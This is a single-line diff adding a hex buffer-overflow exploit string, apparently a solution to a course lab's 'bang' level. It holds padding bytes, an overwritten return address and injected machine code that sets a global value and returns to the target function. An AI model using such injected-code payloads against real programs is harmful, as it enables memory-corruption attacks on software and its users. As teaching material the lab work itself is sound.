@@ -1,0 +1,1 @@
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 98 30 68 55 c7 05 24 d1 04 08 11 0c e0 5f 68 72 8e 04 08 c3 /* 44 '00's and then the address in memory for the next seqence of code which is the exploit string. Executes the code and pushes/returns the address for bang  */
